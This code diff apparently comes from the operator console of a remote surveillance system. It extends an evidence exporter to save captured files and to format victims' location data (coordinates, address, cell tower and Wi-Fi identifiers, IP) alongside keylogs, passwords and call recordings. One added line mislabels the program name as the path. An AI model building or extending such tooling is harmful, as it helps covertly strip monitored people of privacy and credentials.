@@ -16,6 +16,8 @@ package it.ht.rcs.console.operations.view.evidences
   import it.ht.rcs.console.DB;
   import it.ht.rcs.console.evidence.controller.EvidenceManager;
   import it.ht.rcs.console.evidence.model.Evidence;
+  import it.ht.rcs.console.utils.Size;
+  import it.ht.rcs.console.utils.StringUtils;
   
   import mx.collections.ArrayCollection;
   
@@ -53,7 +55,6 @@ package it.ht.rcs.console.operations.view.evidences
     
     private function onDirectorySelected(e:Event):void
     {
-      trace("directory selected");
       trace(directory.nativePath);
       startQueue()
     }
@@ -75,7 +76,6 @@ package it.ht.rcs.console.operations.view.evidences
       }
       else
       {
-        trace("queue completed")
         dispatchEvent(new Event(EXPORT_END));
       }
     }
@@ -87,11 +87,7 @@ package it.ht.rcs.console.operations.view.evidences
         case "screenshot":
           exportImage(evidence);
           break;
-        
-        case "screenshot":
-          exportImage(evidence);
-          break;
-        
+
         case "mouse":
           exportImage(evidence);
           break;
@@ -102,6 +98,20 @@ package it.ht.rcs.console.operations.view.evidences
         
         case "call":
           exportSound(evidence);
+          break;
+        
+        case "file":
+          if(evidence.data.type=="open")
+          {
+            exportText(evidence);
+            break;
+          }
+          else if(evidence.data.type=="capture")
+          {
+            exportFileCapture(evidence);
+            break;
+          }
+          
           break;
         
         case "mic":
@@ -162,7 +172,6 @@ package it.ht.rcs.console.operations.view.evidences
     private function onDownloadProgress(e:ProgressEvent):void
     {
       var perc:int=int((e.bytesLoaded/e.bytesTotal)*100);
-      trace("downloading file "+perc)
       bytesLoaded=e.bytesLoaded
       bytesTotal=e.bytesTotal
       dispatchEvent(new Event(EXPORT_PROGRESS));
@@ -191,13 +200,13 @@ package it.ht.rcs.console.operations.view.evidences
     }
     private function exportText(evidence:Evidence):void
     {
-      trace("export text")
+      
       bytesLoaded=0
       bytesTotal=0
       var target:String=EvidenceManager.instance.evidenceFilter.target;
       extension="txt"
       var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
-      file=new File(directory.nativePath +"/"+fileName);//add 
+      file=new File(directory.nativePath +"/"+fileName);
       var content:String=getInfo(currentEvidence)
       var fileStream:FileStream=new FileStream();
       fileStream.open(file, FileMode.WRITE);
@@ -210,14 +219,14 @@ package it.ht.rcs.console.operations.view.evidences
     
     private function exportImage(evidence:Evidence):void
     {
-      trace("export image");
+      
       var target:String=EvidenceManager.instance.evidenceFilter.target;
       var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
       extension="jpg";
       var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
       request=new URLRequest(url);
       stream=new URLStream();
-      file=new File(directory.nativePath +"/"+fileName);//add filename
+      file=new File(directory.nativePath +"/"+fileName);
       stream.addEventListener(Event.COMPLETE, onFileDownloaded);
       stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
       stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
@@ -228,14 +237,14 @@ package it.ht.rcs.console.operations.view.evidences
     
     private function exportMessage(evidence:Evidence):void
     {
-      trace("export image");
+      
       var target:String=EvidenceManager.instance.evidenceFilter.target;
       var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
       extension="eml";
       var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
       request=new URLRequest(url);
       stream=new URLStream();
-      file=new File(directory.nativePath +"/"+fileName);//add filename
+      file=new File(directory.nativePath +"/"+fileName);
       stream.addEventListener(Event.COMPLETE, onFileDownloaded);
       stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
       stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
@@ -246,14 +255,31 @@ package it.ht.rcs.console.operations.view.evidences
     
     private function exportSound(evidence:Evidence):void
     {
-      trace("export sound")
+      
       var target:String=EvidenceManager.instance.evidenceFilter.target;
       var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
       extension="mp3";
       var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
       request=new URLRequest(url);
       stream=new URLStream();
-      file=new File(directory.nativePath +"/"+fileName);//add filename
+      file=new File(directory.nativePath +"/"+fileName);
+      stream.addEventListener(Event.COMPLETE, onFileDownloaded);
+      stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
+      stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
+      stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
+      stream.load(request);
+    }
+    
+    private function exportFileCapture(evidence:Evidence):void
+    {
+      
+      var target:String=EvidenceManager.instance.evidenceFilter.target;
+      var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
+      extension=StringUtils.getExtension(evidence.data.path)
+      var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
+      request=new URLRequest(url);
+      stream=new URLStream();
+      file=new File(directory.nativePath +"/"+fileName);
       stream.addEventListener(Event.COMPLETE, onFileDownloaded);
       stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
       stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
@@ -263,11 +289,7 @@ package it.ht.rcs.console.operations.view.evidences
     
    
     
-    private function setFileName(evidence:Evidence):String //TODO
-    {
-      var name:String="";
-      return name;
-    }
+    
     
     private function getInfo(evidence:Evidence):String
     {
@@ -316,6 +338,13 @@ package it.ht.rcs.console.operations.view.evidences
           info+="Content: "+evidence.data.content+"\n";
           break;
         
+        case "file":
+          info="File: "+"\n\n";
+          info+="Program: "+evidence.data.program+"\n";
+          info+="Path: "+evidence.data.program+"\n";
+          info+="Size: "+Size.toHumanBytes(evidence.data.size)+"\n";
+          break;
+        
         case "keylog":
           info="Keylog: "+"\n\n";
           info+="Program: "+evidence.data.program+"\n";
@@ -331,12 +360,82 @@ package it.ht.rcs.console.operations.view.evidences
           info+="Pass: "+evidence.data.pass+"\n";
           break;
         
-        case "position"://TODO
+        case "position":
           info="Position: "+"\n\n";
-          info+="Program: "+evidence.data.program+"\n";
-          info+="Service: "+evidence.data.service+"\n";
-          info+="User: "+evidence.data.user+"\n";
-          info+="Pass: "+evidence.data.pass+"\n";
+          info+="Type: "+evidence.data.type+"\n";
+          
+          var lat:String;
+          var lng:String;
+          
+          if(isNaN(evidence.data.latitude))
+          {
+            lat="(unknown)"
+          }
+          else
+          {
+            lat=String(evidence.data.latitude)
+          }
+          if(isNaN(evidence.data.longitude))
+          {
+            lng="(unknown)"
+          }
+          else
+          {
+            lng=String(evidence.data.longitude)
+          }
+          var address:String;
+          var city:String;
+          var country:String;
+          var street_number:String;
+          var street:String;
+          var postal_code:String;
+          
+          if (evidence.data.address == null)
+          {
+            address='(unknown)';
+          }
+          else
+          {
+            city=evidence.data.address.city || "";
+            country=evidence.data.address.country || "";
+            street_number=evidence.data.address.street_number || "";
+            street=evidence.data.address.street || "";
+            postal_code=evidence.data.address.postal_code || "";
+            
+            address=city;
+            if (country != "")
+              address+=" (" + country + ") ";
+            if (street_number != "")
+              address+=street_number + " ";
+            if (street != "")
+              address+=street + " ";
+            if (postal_code != "")
+              address+=postal_code;
+          }
+          
+          var details:String="";
+          
+          if (evidence.data.cell != null)
+          {
+            details+="Cell: " + "adv: " + evidence.data.cell.adv + ", age: " + evidence.data.cell.age + ", cid: " + evidence.data.cell.cid + ", db: " + evidence.data.cell.db + ", lac: " + evidence.data.cell.lac + ", mcc: " + evidence.data.cell.mcc + ", mnc: " + evidence.data.cell.mnc;
+          }
+          
+          if (evidence.data.wifi != null)
+          {
+            for (var k:int=0; k < evidence.data.wifi.length; k++)
+            {
+              details+="WIFI: " + "bssid: " + evidence.data.wifi.getItemAt(k).bssid + ", mac: " + evidence.data.wifi.getItemAt(k).mac + ", sig: " + evidence.data.wifi.getItemAt(k).sig + "\n";
+            }
+          }
+          if(evidence.data.ip != null)
+          {
+            details+="IP: "+ evidence.data.ip;
+          }
+
+          info+="Latitude: "+lat+"\n";
+          info+="Longitude: "+lng+"\n";
+          info+="Address: "+address+"\n";
+          info+=details;
           break;
         
         case "print":
